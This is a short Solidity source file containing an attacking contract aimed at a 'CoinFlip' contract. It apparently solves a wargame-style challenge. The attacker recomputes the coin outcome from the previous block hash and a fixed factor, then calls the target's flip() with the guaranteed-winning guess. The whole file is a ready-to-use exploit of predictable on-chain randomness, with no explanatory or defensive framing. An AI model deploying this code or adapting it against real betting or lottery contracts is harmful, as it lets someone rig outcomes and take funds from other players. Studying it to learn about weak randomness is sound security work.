pragma solidity ^0.4.24;

contract CoinFlip {
    function flip(bool _guess) public returns (bool);
}
contract YouWinThisOne {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip cf;
    function set(address add) public {
        cf = CoinFlip(add);
    }
    function flip() public {
        uint256 blockValue = uint256(block.blockhash(block.number-1));

        bool side = false;
        if(blockValue >= FACTOR){
          side = true;
        }
        cf.flip(side);
    }
}